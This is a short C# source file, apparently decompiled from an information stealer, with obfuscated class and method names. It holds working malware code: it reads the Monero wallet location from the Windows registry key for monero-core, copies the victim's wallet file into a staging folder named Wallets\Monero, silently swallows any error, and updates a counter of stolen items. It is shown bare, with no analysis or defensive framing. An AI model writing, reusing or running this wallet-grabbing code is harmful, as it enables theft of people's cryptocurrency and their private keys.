using System.IO;
using Microsoft.Win32;

internal class Class70
{
	public static int int_0 = 0;

	public static string string_0 = "\\Wallets\\Monero\\";

	public static void smethod_0(string string_1)
	{
		try
		{
			RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Software")!.OpenSubKey("monero-project")!.OpenSubKey("monero-core");
			Directory.CreateDirectory(string_1 + string_0);
			string text = registryKey!.GetValue("wallet_path")!.ToString()!.Replace("/", "\\");
			Directory.CreateDirectory(string_1 + string_0);
			File.Copy(text, string_1 + string_0 + text.Split(new char[1] { '\\' })[text.Split(new char[1] { '\\' }).Length - 1]);
			int_0++;
			Class36.int_12++;
		}
		catch
		{
		}
	}
}
